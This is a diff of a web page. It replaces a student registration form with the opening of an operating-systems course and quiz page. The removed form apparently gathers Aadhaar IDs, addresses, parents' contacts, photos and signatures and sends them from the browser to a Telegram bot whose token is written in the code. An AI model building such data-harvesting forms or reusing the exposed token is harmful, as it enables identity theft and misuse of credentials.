@@ -3,654 +3,728 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Student MIS Registration</title>
+    <title>Operating Systems: Basics & Beyond</title>
+    <!-- Load Tailwind CSS -->
+    <script src="https://cdn.tailwindcss.com"></script>
+    <!-- Load FontAwesome for icons -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <!-- Google Fonts -->
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;700&display=swap" rel="stylesheet">
     <style>
-        :root {
-            --primary: #1d4ed8; /* Professional Blue */
-            --primary-hover: #1e40af;
-            --secondary: #f1f5f9;
-            --background: #e2e8f0;
-            --text-dark: #0f172a;
-            --text-muted: #64748b;
-            --border-color: #cbd5e1;
-            --input-bg: #f8fafc;
-        }
-
         body {
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            background-color: var(--background);
-            color: var(--text-dark);
-            margin: 0;
-            padding: 20px;
-            display: flex;
-            justify-content: center;
-            align-items: flex-start;
-            min-height: 100vh;
+            font-family: 'Inter', sans-serif;
+            background-color: #f8fafc; /* Slate 50 */
+            color: #334155; /* Slate 700 */
         }
-
-        .main-wrapper {
-            background: #ffffff;
-            border-radius: 12px;
-            box-shadow: 0 10px 25px rgba(0,0,0,0.08);
-            max-width: 900px;
-            width: 100%;
-            overflow: hidden;
-            position: relative;
+        .fade-in {
+            animation: fadeIn 0.5s ease-in-out;
         }
-
-        .header {
-            background: var(--primary);
-            color: white;
-            padding: 30px;
-            text-align: center;
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(10px); }
+            to { opacity: 1; transform: translateY(0); }
         }
-
-        .header h1 {
-            margin: 0;
-            font-size: 28px;
-            font-weight: 600;
+        .code-block {
+            background-color: #1e293b; /* Slate 800 */
+            color: #e2e8f0; /* Slate 200 */
+            padding: 1rem;
+            border-radius: 0.5rem;
+            font-family: monospace;
+            overflow-x: auto;
+            margin: 1rem 0;
+            white-space: pre-wrap;
         }
-
-        .header p {
-            margin: 10px 0 0 0;
-            color: #bfdbfe;
-            font-size: 15px;
+        /* Custom scrollbar for a cleaner look */
+        ::-webkit-scrollbar {
+            width: 8px;
         }
-
-        .container {
-            padding: 40px;
+        ::-webkit-scrollbar-track {
+            background: #f1f5f9;
         }
-
-        .section-title {
-            font-size: 18px;
-            color: var(--primary);
-            border-bottom: 2px solid var(--secondary);
-            padding-bottom: 10px;
-            margin-top: 30px;
-            margin-bottom: 20px;
-            font-weight: 600;
+        ::-webkit-scrollbar-thumb {
+            background: #cbd5e1;
+            border-radius: 4px;
         }
-        
-        .section-title:first-child {
-            margin-top: 0;
+        ::-webkit-scrollbar-thumb:hover {
+            background: #94a3b8;
         }
-
-        .grid-2 { display: grid; grid-template-columns: 1fr 1fr; gap: 20px; }
-        .grid-3 { display: grid; grid-template-columns: 1fr 1fr 1fr; gap: 20px; }
-
-        .form-group { margin-bottom: 20px; }
-        
-        label { 
-            display: block; 
-            font-weight: 600; 
-            margin-bottom: 8px; 
-            color: #334155; 
-            font-size: 14px;
-        }
-        
-        select, input[type="text"], input[type="date"], input[type="tel"], input[type="email"], input[type="number"] {
-            width: 100%; 
-            padding: 12px 15px; 
-            border: 1px solid var(--border-color);
-            background-color: var(--input-bg);
-            border-radius: 8px; 
-            box-sizing: border-box; 
-            font-size: 15px;
-            color: var(--text-dark);
+        .quiz-option {
             transition: all 0.2s ease;
         }
-        
-        select:focus, input[type="text"]:focus, input[type="date"]:focus, input[type="tel"]:focus, input[type="email"]:focus, input[type="number"]:focus { 
-            border-color: var(--primary); 
-            background-color: white;
-            outline: none; 
-            box-shadow: 0 0 0 3px rgba(29, 78, 216, 0.15);
-        }
-
-        input[type="file"] {
-            width: 100%;
-            padding: 9px;
-            border: 1px dashed var(--border-color);
-            background-color: var(--input-bg);
-            border-radius: 8px;
-            box-sizing: border-box;
-            font-size: 14px;
-            color: var(--text-dark);
-            transition: all 0.2s ease;
+        .quiz-option:hover:not(.selected):not(.disabled) {
+            background-color: #e2e8f0; /* Slate 200 */
             cursor: pointer;
         }
-
-        input[type="file"]::file-selector-button {
-            background: var(--primary);
+        .quiz-option.selected {
+            background-color: #3b82f6; /* Blue 500 */
             color: white;
-            border: none;
-            padding: 8px 16px;
-            border-radius: 6px;
-            cursor: pointer;
-            margin-right: 12px;
-            font-size: 14px;
-            font-weight: 600;
-            transition: background 0.2s;
+            border-color: #2563eb; /* Blue 600 */
         }
-
-        input[type="file"]::file-selector-button:hover {
-            background: var(--primary-hover);
-        }
-        
-        input[type="file"]:focus {
-            border-color: var(--primary); 
-            outline: none; 
-            box-shadow: 0 0 0 3px rgba(29, 78, 216, 0.15);
-        }
-
-        .checkbox-group {
-            display: flex;
-            align-items: center;
-            margin-bottom: 20px;
-            padding: 10px;
-            background: var(--secondary);
-            border-radius: 8px;
-        }
-
-        .checkbox-group input {
-            margin-right: 10px;
-            width: 18px;
-            height: 18px;
-            cursor: pointer;
-        }
-        
-        .checkbox-group label {
-            margin-bottom: 0;
-            cursor: pointer;
-        }
-
-        .btn-submit {
-            width: 100%; 
-            background: var(--primary);
+        .quiz-option.correct {
+            background-color: #22c55e; /* Green 500 */
             color: white;
-            border: none; 
-            padding: 16px; 
-            font-size: 18px; 
-            font-weight: bold;
-            border-radius: 8px; 
-            cursor: pointer; 
-            transition: background 0.2s, transform 0.1s;
-            margin-top: 30px;
+            border-color: #16a34a; /* Green 600 */
         }
-        
-        .btn-submit:hover { 
-            background: var(--primary-hover);
+        .quiz-option.incorrect {
+            background-color: #ef4444; /* Red 500 */
+            color: white;
+            border-color: #dc2626; /* Red 600 */
         }
-        
-        .btn-submit:active { 
-            transform: scale(0.99);
+        .disabled {
+            pointer-events: none;
+            opacity: 0.8;
         }
-
-        .success-message {
+        .hidden-content {
             display: none;
-            text-align: center;
-            padding: 60px 20px;
         }
-
-        .success-message h2 {
-            color: #10b981;
-            font-size: 28px;
-        }
-
-        .success-message p {
-            color: var(--text-muted);
-            font-size: 16px;
-        }
-
-        /* Responsive Design */
-        @media (max-width: 768px) {
-            .grid-2, .grid-3 { grid-template-columns: 1fr; gap: 0; }
-            .container { padding: 20px; }
+        .course-nav-btn.active {
+             background-color: #1d4ed8; /* blue-700 */
         }
     </style>
 </head>
-<body>
+<body class="min-h-screen flex flex-col">
 
-<div class="main-wrapper">
-    <div class="header">
-        <h1>Student MIS Registration</h1>
-        <p>Management Information System Portal</p>
-    </div>
-
-    <div class="container" id="formContainer">
-        <form id="misForm">
-            
-            <!-- SECTION 1: General/Personal Information -->
-            <h2 class="section-title">Section 1: General/Personal Information</h2>
-            
-            <div class="grid-3">
-                <div class="form-group">
-                    <label>First Name</label>
-                    <input type="text" name="first_name" required placeholder="Enter First Name">
+    <!-- Navigation -->
+    <nav class="bg-blue-600 text-white shadow-md sticky top-0 z-50">
+        <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
+            <div class="flex justify-between h-16">
+                <div class="flex items-center">
+                    <i class="fa-solid fa-microchip text-2xl mr-3"></i>
+                    <span class="font-bold text-xl tracking-tight hidden sm:block">OS Fundamentals Masterclass</span>
+                    <span class="font-bold text-xl tracking-tight sm:hidden">OS Master</span>
                 </div>
-                <div class="form-group">
-                    <label>Middle Name</label>
-                    <input type="text" name="middle_name" placeholder="Enter Middle Name">
-                </div>
-                <div class="form-group">
-                    <label>Last Name</label>
-                    <input type="text" name="last_name" required placeholder="Enter Last Name">
+                <div class="flex items-center space-x-2 sm:space-x-4">
+                    <button onclick="switchTab('course')" id="nav-course" class="px-3 py-2 rounded-md text-sm font-medium course-nav-btn active hover:bg-blue-800 transition">Course Material</button>
+                    <button onclick="switchTab('quiz')" id="nav-quiz" class="px-3 py-2 rounded-md text-sm font-medium course-nav-btn hover:bg-blue-700 transition">Take Quiz</button>
                 </div>
             </div>
+        </div>
+    </nav>
 
-            <div class="grid-3">
-                <div class="form-group">
-                    <label>Date of Birth</label>
-                    <input type="date" name="dob" required>
-                </div>
-                <div class="form-group">
-                    <label>Gender</label>
-                    <select name="gender" required>
-                        <option value="">Select Gender...</option>
-                        <option value="Male">Male</option>
-                        <option value="Female">Female</option>
-                        <option value="Other">Other</option>
-                    </select>
-                </div>
-                <div class="form-group">
-                    <label>Blood Group</label>
-                    <select name="blood_group">
-                        <option value="">Select Blood Group...</option>
-                        <option value="A+">A+</option>
-                        <option value="A-">A-</option>
-                        <option value="B+">B+</option>
-                        <option value="B-">B-</option>
-                        <option value="O+">O+</option>
-                        <option value="O-">O-</option>
-                        <option value="AB+">AB+</option>
-                        <option value="AB-">AB-</option>
-                    </select>
-                </div>
-            </div>
-
-            <div class="grid-3">
-                <div class="form-group">
-                    <label>Nationality</label>
-                    <input type="text" name="nationality" required placeholder="e.g., Indian">
-                </div>
-                <div class="form-group">
-                    <label>Aadhaar / National ID Number</label>
-                    <input type="text" name="aadhaar" required placeholder="XXXX XXXX XXXX" pattern="\d{12}" title="12 digit ID number">
-                </div>
-                <div class="form-group">
-                    <label>Category</label>
-                    <select name="category" required>
-                        <option value="">Select Category...</option>
-                        <option value="General">General</option>
-                        <option value="SC">SC</option>
-                        <option value="ST">ST</option>
-                        <option value="OBC">OBC</option>
-                        <option value="Other">Other</option>
-                    </select>
-                </div>
-            </div>
-
-            <!-- SECTION 2: Contact Details -->
-            <h2 class="section-title">Section 2: Contact Details</h2>
-            
-            <div class="grid-2">
-                <div class="form-group">
-                    <label>Student Mobile Number</label>
-                    <input type="tel" name="mobile" required placeholder="Enter mobile number">
-                </div>
-                <div class="form-group">
-                    <label>Student Email Address</label>
-                    <input type="email" name="email" required placeholder="Enter email address">
-                </div>
-            </div>
-
-            <!-- Current Address -->
-            <div class="form-group" style="margin-bottom: 5px;">
-                <label style="color: var(--primary);">Current Address</label>
-            </div>
-            <div class="grid-2">
-                <div class="form-group">
-                    <label>Street/Locality</label>
-                    <input type="text" id="curr_street" name="curr_street" required placeholder="House No, Street, Landmark">
-                </div>
-                <div class="form-group">
-                    <label>City</label>
-                    <input type="text" id="curr_city" name="curr_city" required placeholder="City">
-                </div>
-            </div>
-            <div class="grid-2">
-                <div class="form-group">
-                    <label>State</label>
-                    <input type="text" id="curr_state" name="curr_state" required placeholder="State">
-                </div>
-                <div class="form-group">
-                    <label>PIN/ZIP Code</label>
-                    <input type="text" id="curr_pin" name="curr_pin" required placeholder="PIN Code">
-                </div>
-            </div>
-
-            <!-- Permanent Address -->
-            <div class="form-group" style="margin-bottom: 10px;">
-                <label style="color: var(--primary);">Permanent Address</label>
-            </div>
-            <div class="checkbox-group">
-                <input type="checkbox" id="sameAddressBtn">
-                <label for="sameAddressBtn">Same as Current Address</label>
-            </div>
-
-            <div class="grid-2">
-                <div class="form-group">
-                    <label>Street/Locality</label>
-                    <input type="text" id="perm_street" name="perm_street" required placeholder="House No, Street, Landmark">
-                </div>
-                <div class="form-group">
-                    <label>City</label>
-                    <input type="text" id="perm_city" name="perm_city" required placeholder="City">
-                </div>
-            </div>
-            <div class="grid-2">
-                <div class="form-group">
-                    <label>State</label>
-                    <input type="text" id="perm_state" name="perm_state" required placeholder="State">
-                </div>
-                <div class="form-group">
-                    <label>PIN/ZIP Code</label>
-                    <input type="text" id="perm_pin" name="perm_pin" required placeholder="PIN Code">
-                </div>
-            </div>
-
-            <!-- SECTION 3: Parent / Guardian Information -->
-            <h2 class="section-title">Section 3: Parent / Guardian Information</h2>
-            
-            <div class="grid-3">
-                <div class="form-group">
-                    <label>Father's Name</label>
-                    <input type="text" name="father_name" required placeholder="Full Name">
-                </div>
-                <div class="form-group">
-                    <label>Occupation</label>
-                    <input type="text" name="father_occ" placeholder="Occupation">
-                </div>
-                <div class="form-group">
-                    <label>Mobile Number</label>
-                    <input type="tel" name="father_mobile" required placeholder="Mobile Number">
-                </div>
-            </div>
-
-            <div class="grid-3">
-                <div class="form-group">
-                    <label>Mother's Name</label>
-                    <input type="text" name="mother_name" required placeholder="Full Name">
-                </div>
-                <div class="form-group">
-                    <label>Occupation</label>
-                    <input type="text" name="mother_occ" placeholder="Occupation">
-                </div>
-                <div class="form-group">
-                    <label>Mobile Number</label>
-                    <input type="tel" name="mother_mobile" placeholder="Mobile Number">
-                </div>
-            </div>
-
-            <div class="grid-3">
-                <div class="form-group">
-                    <label>Local Guardian Name (Optional)</label>
-                    <input type="text" name="guardian_name" placeholder="Full Name">
-                </div>
-                <div class="form-group">
-                    <label>Relationship to Student</label>
-                    <input type="text" name="guardian_rel" placeholder="e.g., Uncle, Aunt">
-                </div>
-                <div class="form-group">
-                    <label>Guardian Mobile Number</label>
-                    <input type="tel" name="guardian_mobile" placeholder="Mobile Number">
-                </div>
-            </div>
-
-            <!-- SECTION 4: Academic History -->
-            <h2 class="section-title">Section 4: Academic History</h2>
-            
-            <div class="grid-2">
-                <div class="form-group">
-                    <label>Previous School/College Attended</label>
-                    <input type="text" name="prev_school" required placeholder="Institution Name">
-                </div>
-                <div class="form-group">
-                    <label>Board / University</label>
-                    <input type="text" name="board" required placeholder="e.g., CBSE, State Board">
-                </div>
-            </div>
-
-            <div class="grid-3">
-                <div class="form-group">
-                    <label>Year of Passing</label>
-                    <input type="number" name="yop" min="1990" max="2026" required placeholder="YYYY">
-                </div>
-                <div class="form-group">
-                    <label>Percentage / CGPA</label>
-                    <input type="text" name="percentage" required placeholder="e.g., 85% or 8.5">
-                </div>
-                <div class="form-group">
-                    <label>Program/Course Applying For</label>
-                    <select name="course" required>
-                        <option value="">Select Program...</option>
-                        <option value="B.Tech">B.Tech</option>
-                        <option value="B.Sc">B.Sc</option>
-                        <option value="B.Com">B.Com</option>
-                        <option value="B.A.">B.A.</option>
-                        <option value="M.Tech">M.Tech</option>
-                        <option value="MBA">MBA</option>
-                    </select>
-                </div>
-            </div>
-
-            <!-- SECTION 5: Document Upload -->
-            <h2 class="section-title">Section 5: Document Upload</h2>
-            
-            <div class="grid-3">
-                <div class="form-group">
-                    <label>Passport Size Photo</label>
-                    <input type="file" name="photo" accept="image/png, image/jpeg" required>
-                    <small style="color: var(--text-muted); font-size: 12px; display: block; margin-top: 4px;">Format: JPG/PNG, Max: 2MB</small>
-                </div>
-                <div class="form-group">
-                    <label>Student Signature</label>
-                    <input type="file" name="signature" accept="image/png, image/jpeg" required>
-                    <small style="color: var(--text-muted); font-size: 12px; display: block; margin-top: 4px;">Format: JPG/PNG, Max: 1MB</small>
-                </div>
-                <div class="form-group">
-                    <label>Marksheet / ID Proof</label>
-                    <input type="file" name="marksheet" accept=".pdf, image/jpeg, image/png" required>
-                    <small style="color: var(--text-muted); font-size: 12px; display: block; margin-top: 4px;">Format: PDF/JPG, Max: 5MB</small>
-                </div>
-            </div>
-
-            <button type="submit" class="btn-submit" id="submitBtn">Submit MIS Registration</button>
-        </form>
-    </div>
-
-    <!-- Success View -->
-    <div class="success-message" id="successView">
-        <h2>✅ Registration Successful!</h2>
-        <p>Your information has been securely recorded in the MIS database.</p>
-        <p>Your registration reference number is: <strong id="refNumber"></strong></p>
-        <button class="btn-submit" onclick="location.reload()" style="width: auto; padding: 10px 30px; margin-top: 20px;">Submit Another</button>
-    </div>
-</div>
-
-<script>
-    // Telegram Bot Configuration
-    const BOT_TOKEN = '8919666195:AAE1kQrD3SEXBYbKZPrOjtoFUHljDxZHPYY';
-    const CHAT_ID = '2147403583';
-
-    // Handle "Same as Current Address" Checkbox
-    const sameAddressBtn = document.getElementById('sameAddressBtn');
-    
-    const currFields = {
-        street: document.getElementById('curr_street'),
-        city: document.getElementById('curr_city'),
-        state: document.getElementById('curr_state'),
-        pin: document.getElementById('curr_pin')
-    };
-    
-    const permFields = {
-        street: document.getElementById('perm_street'),
-        city: document.getElementById('perm_city'),
-        state: document.getElementById('perm_state'),
-        pin: document.getElementById('perm_pin')
-    };
-
-    sameAddressBtn.addEventListener('change', function() {
-        if (this.checked) {
-            // Copy values
-            permFields.street.value = currFields.street.value;
-            permFields.city.value = currFields.city.value;
-            permFields.state.value = currFields.state.value;
-            permFields.pin.value = currFields.pin.value;
-            
-            // Make read-only to prevent accidental edits
-            Object.values(permFields).forEach(field => {
-                field.readOnly = true;
-                field.style.backgroundColor = "#e2e8f0"; 
-            });
-        } else {
-            // Clear values and remove read-only
-            Object.values(permFields).forEach(field => {
-                field.value = '';
-                field.readOnly = false;
-                field.style.backgroundColor = "var(--input-bg)";
-            });
-        }
-    });
-
-    // Update permanent address automatically if checkbox is ticked and user edits current address
-    Object.keys(currFields).forEach(key => {
-        currFields[key].addEventListener('input', function() {
-            if (sameAddressBtn.checked) {
-                permFields[key].value = this.value;
-            }
-        });
-    });
-
-    // Handle Form Submission and send to Telegram
-    document.getElementById('misForm').addEventListener('submit', async function(e) {
-        e.preventDefault(); // Prevent page reload
+    <!-- Main Content Area -->
+    <main class="flex-grow max-w-5xl mx-auto w-full px-4 sm:px-6 lg:px-8 py-8">
         
-        const submitBtn = document.getElementById('submitBtn');
-        const originalBtnText = submitBtn.innerText;
-        submitBtn.innerText = 'Submitting... Please wait';
-        submitBtn.disabled = true;
-
-        const formData = new FormData(this);
-        
-        // 1. Construct a brief summary message for Telegram
-        let message = `🎓 *New MIS Registration Received*\n`;
-        message += `Name: ${formData.get('first_name')} ${formData.get('last_name')}\n`;
-        message += `Course: ${formData.get('course')}\n`;
-        message += `_A detailed Excel (CSV) file and documents are attached below._`;
-
-        // 2. Generate CSV (Excel) Data
-        const headers = [
-            "First Name", "Middle Name", "Last Name", "DOB", "Gender", "Blood Group", 
-            "Nationality", "Aadhaar", "Category", "Mobile", "Email", 
-            "Current Street", "Current City", "Current State", "Current PIN",
-            "Permanent Street", "Permanent City", "Permanent State", "Permanent PIN",
-            "Father Name", "Father Occ", "Father Mobile",
-            "Mother Name", "Mother Occ", "Mother Mobile",
-            "Guardian Name", "Guardian Rel", "Guardian Mobile",
-            "Prev School", "Board", "Year of Passing", "Percentage", "Course"
-        ];
-        
-        const rowData = [
-            formData.get('first_name'), formData.get('middle_name'), formData.get('last_name'),
-            formData.get('dob'), formData.get('gender'), formData.get('blood_group'),
-            formData.get('nationality'), formData.get('aadhaar'), formData.get('category'),
-            formData.get('mobile'), formData.get('email'),
-            formData.get('curr_street'), formData.get('curr_city'), formData.get('curr_state'), formData.get('curr_pin'),
-            formData.get('perm_street'), formData.get('perm_city'), formData.get('perm_state'), formData.get('perm_pin'),
-            formData.get('father_name'), formData.get('father_occ'), formData.get('father_mobile'),
-            formData.get('mother_name'), formData.get('mother_occ'), formData.get('mother_mobile'),
-            formData.get('guardian_name'), formData.get('guardian_rel'), formData.get('guardian_mobile'),
-            formData.get('prev_school'), formData.get('board'), formData.get('yop'), formData.get('percentage'), formData.get('course')
-        ];
-
-        // Function to safely escape data for CSV
-        const escapeCsv = (val) => {
-            if (val === null || val === undefined) return '""';
-            return `"${String(val).replace(/"/g, '""')}"`;
-        };
-
-        const csvString = headers.join(',') + '\n' + rowData.map(escapeCsv).join(',');
-        const csvBlob = new Blob([csvString], { type: 'text/csv' });
-        const csvFileName = `${formData.get('first_name')}_${formData.get('last_name')}_MIS_Data.csv`;
-
-        try {
-            // 3. Send the Text Summary Payload
-            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    chat_id: CHAT_ID,
-                    text: message,
-                    parse_mode: 'Markdown'
-                })
-            });
-
-            // 4. Send the CSV Document
-            const csvFormData = new FormData();
-            csvFormData.append('chat_id', CHAT_ID);
-            csvFormData.append('document', csvBlob, csvFileName);
-            csvFormData.append('caption', `📊 Excel Data for ${formData.get('first_name')}`);
+        <!-- ==================== COURSE SECTION ==================== -->
+        <section id="course-section" class="fade-in bg-white p-6 md:p-10 rounded-xl shadow-lg border border-slate-200">
+            <h1 class="text-4xl font-extrabold text-slate-900 mb-2">Comprehensive Operating Systems Course</h1>
+            <p class="text-lg text-slate-500 mb-8 border-b pb-4">Master the core concepts that power every computing device.</p>
             
-            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, {
-                method: 'POST',
-                body: csvFormData
-            });
-
-            // 5. Sequentially Upload Files (Photo, Signature, Marksheet)
-            const fileFields = [
-                { name: 'photo', label: 'Passport Photo' },
-                { name: 'signature', label: 'Signature' },
-                { name: 'marksheet', label: 'Marksheet' }
-            ];
-
-            for (const fileField of fileFields) {
-                const file = formData.get(fileField.name);
-                if (file && file.size > 0) {
-                    const fileData = new FormData();
-                    fileData.append('chat_id', CHAT_ID);
-                    fileData.append('document', file);
-                    fileData.append('caption', `${fileField.label} - ${formData.get('first_name')} ${formData.get('last_name')}`);
+            <div class="space-y-16">
+                
+                <!-- Module 1: Introduction -->
+                <div>
+                    <h2 class="text-3xl font-bold text-blue-700 mb-6 flex items-center"><i class="fa-solid fa-rocket mr-3"></i> 1. Introduction & Overview</h2>
                     
-                    // Upload document securely to Telegram
-                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, {
-                        method: 'POST',
-                        body: fileData
-                    });
+                    <h3 class="text-xl font-semibold mt-4 mb-2 text-slate-800">1.1 What is an Operating System?</h3>
+                    <p class="mb-4 leading-relaxed text-lg text-slate-700">An Operating System (OS) is the most critical system software running on a computer. It acts as an intermediary between the user of a computer and the computer hardware. Without an OS, every program would need to include its own code to manage hardware components like the CPU, memory, and disk drives.</p>
+                    
+                    <div class="bg-slate-50 border-l-4 border-blue-500 p-6 mb-6 rounded-r-md shadow-sm">
+                        <h4 class="font-bold text-slate-800 mb-3 text-lg">The Dual Role of an OS</h4>
+                        <ol class="list-decimal list-inside text-slate-700 space-y-3">
+                            <li><strong>Resource Manager:</strong> The OS acts as a fair referee, allocating resources (CPU time, memory space, file storage, I/O devices) to specific programs and users as necessary for their tasks. It handles conflicts and ensures efficiency.</li>
+                            <li><strong>Control Program:</strong> It controls the execution of user programs to prevent errors and improper use of the computer. It provides a consistent, abstracted interface for applications to interact with hardware.</li>
+                        </ol>
+                    </div>
+
+                    <h3 class="text-xl font-semibold mt-6 mb-2 text-slate-800">1.2 A Brief History of Operating Systems</h3>
+                    <ul class="list-disc list-inside text-slate-700 space-y-2 mb-6 ml-4">
+                        <li><strong>First Generation (1945-1955): Vacuum Tubes and Plugboards.</strong> No OS existed. Programs were written in machine language and manually wired into the computer.</li>
+                        <li><strong>Second Generation (1955-1965): Transistors and Batch Systems.</strong> Introduction of batch processing. Jobs with similar needs were batched together to speed up processing. The OS was simple, mostly just a transfer program.</li>
+                        <li><strong>Third Generation (1965-1980): ICs and Multiprogramming.</strong> Introduction of Multiprogramming (keeping multiple jobs in memory to keep the CPU busy) and Spooling (Simultaneous Peripheral Operations On-Line). Time-sharing systems emerged, allowing interactive computing. UNIX was developed.</li>
+                        <li><strong>Fourth Generation (1980-Present): Personal Computers.</strong> GUI (Graphical User Interface) became standard. Network operating systems and distributed operating systems developed. Examples: Windows, macOS, Linux, Android, iOS.</li>
+                    </ul>
+
+                    <h3 class="text-xl font-semibold mt-6 mb-2 text-slate-800">1.3 OS Booting Process (Example)</h3>
+                    <p class="mb-4 text-slate-700">When you press the power button, the computer goes through a specific sequence:</p>
+                    <div class="bg-gray-100 p-4 rounded-md font-mono text-sm mb-4">
+                        1. Power On Self Test (POST) by BIOS/UEFI.<br>
+                        2. BIOS/UEFI locates the Boot Device (e.g., Hard Drive, USB).<br>
+                        3. BIOS/UEFI loads the Master Boot Record (MBR) or EFI System Partition.<br>
+                        4. The Bootloader (e.g., GRUB, Windows Boot Manager) is executed.<br>
+                        5. The Bootloader loads the OS Kernel into Main Memory (RAM).<br>
+                        6. The Kernel initializes hardware, starts background services (daemons), and mounts the root file system.<br>
+                        7. User Space initialization (e.g., presenting the login screen or desktop).
+                    </div>
+                </div>
+
+                <!-- Module 2: Process Management -->
+                <div>
+                    <h2 class="text-3xl font-bold text-blue-700 mb-6 flex items-center"><i class="fa-solid fa-gears mr-3"></i> 2. Process Management & Scheduling</h2>
+                    <p class="mb-4 leading-relaxed text-lg text-slate-700">A program by itself is not a process; a program is a passive entity (a file containing instructions), whereas a process is an active entity, with a program counter specifying the next instruction to execute.</p>
+                    
+                    <h3 class="text-xl font-semibold mt-6 mb-2 text-slate-800">2.1 The Process Control Block (PCB)</h3>
+                    <p class="mb-2 text-slate-700">The OS maintains information about every process in a data structure called the PCB. It contains:</p>
+                    <ul class="grid grid-cols-1 md:grid-cols-2 gap-2 text-slate-700 mb-6 ml-4 list-disc list-inside">
+                        <li>Process State (e.g., new, ready, running)</li>
+                        <li>Program Counter (address of next instruction)</li>
+                        <li>CPU Registers (contents of registers when interrupted)</li>
+                        <li>CPU Scheduling Information (priority)</li>
+                        <li>Memory Management Information (page tables)</li>
+                        <li>Accounting Information (CPU used, time limits)</li>
+                        <li>I/O Status Information (devices allocated)</li>
+                    </ul>
+
+                    <h3 class="text-xl font-semibold mt-6 mb-2 text-slate-800">2.2 Process States and Transitions</h3>
+                    <div class="flex flex-wrap gap-3 mb-4 justify-center py-4 bg-slate-50 rounded-lg border border-slate-200">
+                        <span class="px-4 py-2 bg-gray-200 rounded-md shadow text-sm font-bold text-gray-700">New</span>
+                        <i class="fa-solid fa-arrow-right text-gray-400 self-center"></i>
+                        <span class="px-4 py-2 bg-green-200 rounded-md shadow text-sm font-bold text-green-800">Ready</span>
+                        <i class="fa-solid fa-arrow-right-arrow-left text-gray-400 self-center"></i>
+                        <span class="px-4 py-2 bg-blue-200 rounded-md shadow text-sm font-bold text-blue-800">Running</span>
+                        <i class="fa-solid fa-arrow-right text-gray-400 self-center"></i>
+                        <span class="px-4 py-2 bg-red-200 rounded-md shadow text-sm font-bold text-red-800">Terminated</span>
+                    </div>
+                    <p class="text-sm text-center text-slate-500 mb-6">Processes can also move from 'Running' to 'Waiting/Blocked' if they need I/O, and then back to 'Ready'.</p>
+
+                    <h3 class="text-xl font-semibold mt-6 mb-2 text-slate-800">2.3 CPU Scheduling Algorithms Explained</h3>
+                    <p class="mb-4 text-slate-700">The CPU scheduler decides which process in the Ready queue gets the CPU next. The goal is to optimize CPU utilization, throughput, turnaround time, waiting time, and response time.</p>
+
+                    <div class="space-y-4">
+                        <div class="border-l-4 border-indigo-500 pl-4 py-1">
+                            <h4 class="font-bold text-slate-800">First-Come, First-Served (FCFS)</h4>
+                            <p class="text-slate-600 text-sm">Simplest algorithm. Non-preemptive. Processes are served in the exact order they arrive. Can suffer from the <strong>Convoy Effect</strong>: short processes wait for one long process to finish.</p>
+                        </div>
+                        <div class="border-l-4 border-indigo-500 pl-4 py-1">
+                            <h4 class="font-bold text-slate-800">Shortest Job First (SJF)</h4>
+                            <p class="text-slate-600 text-sm">Selects the process with the smallest next CPU burst. Provides minimum average waiting time. Can be preemptive (Shortest Remaining Time First) or non-preemptive. Risk: <strong>Starvation</strong> of long processes.</p>
+                        </div>
+                        <div class="border-l-4 border-indigo-500 pl-4 py-1">
+                            <h4 class="font-bold text-slate-800">Round Robin (RR)</h4>
+                            <p class="text-slate-600 text-sm">Designed for time-sharing systems. Each process gets a small unit of CPU time (time quantum, e.g., 10-100ms). Preemptive. If a process doesn't finish in its quantum, it's moved to the back of the Ready queue.</p>
+                        </div>
+                        <div class="border-l-4 border-indigo-500 pl-4 py-1">
+                            <h4 class="font-bold text-slate-800">Multilevel Queue Scheduling</h4>
+                            <p class="text-slate-600 text-sm">Partitions the ready queue into multiple separate queues (e.g., foreground interactive processes vs. background batch processes). Each queue has its own scheduling algorithm. Queues are prioritized.</p>
+                        </div>
+                    </div>
+
+                    <h4 class="font-semibold mt-6 mb-2 text-slate-800">Scheduling Example Calculation (SJF Non-preemptive)</h4>
+                    <div class="bg-slate-800 text-slate-200 p-4 rounded-md font-mono text-sm overflow-x-auto">
+Process | Arrival Time | Burst Time
+   P1   |      0       |     6
+   P2   |      2       |     2
+   P3   |      4       |     1
+   P4   |      5       |     3
+
+Gantt Chart:
+[0]--P1--[6]--P3--[7]--P2--[9]--P4--[12]
+(P1 runs first because it's the only one there at t=0. 
+ At t=6, P2, P3, P4 are ready. P3 has the shortest burst (1).)
+
+Waiting Time (WT = Start Time - Arrival Time):
+WT(P1) = 0 - 0 = 0
+WT(P2) = 7 - 2 = 5
+WT(P3) = 6 - 4 = 2
+WT(P4) = 9 - 5 = 4
+Average WT = (0 + 5 + 2 + 4) / 4 = 2.75
+                    </div>
+                </div>
+
+                <!-- Module 3: Concurrency and Synchronization -->
+                <div>
+                    <h2 class="text-3xl font-bold text-blue-700 mb-6 flex items-center"><i class="fa-solid fa-traffic-light mr-3"></i> 3. Concurrency & Synchronization</h2>
+                    <p class="mb-4 leading-relaxed text-lg text-slate-700">When multiple processes execute concurrently, they may need to share data or hardware. If access is not controlled, data inconsistency occurs.</p>
+
+                    <h3 class="text-xl font-semibold mt-4 mb-2 text-slate-800">3.1 The Critical Section Problem</h3>
+                    <p class="mb-4 text-slate-700">A Critical Section is a segment of code where a process accesses shared resources (variables, files, etc.). The problem is ensuring that when one process is in its Critical Section, no other process is allowed into its Critical Section.</p>
+                    
+                    <div class="bg-blue-50 border border-blue-200 p-4 rounded-lg mb-6">
+                        <h4 class="font-bold text-blue-800 mb-2">A solution to the Critical Section problem must satisfy three requirements:</h4>
+                        <ol class="list-decimal list-inside text-blue-900 space-y-1">
+                            <li><strong>Mutual Exclusion:</strong> Only one process can be in the critical section at a time.</li>
+                            <li><strong>Progress:</strong> If no process is in the critical section, processes waiting to enter should get a chance.</li>
+                            <li><strong>Bounded Waiting:</strong> There must be a limit on how many times other processes can enter their critical sections after a process has made a request to enter its own.</li>
+                        </ol>
+                    </div>
+
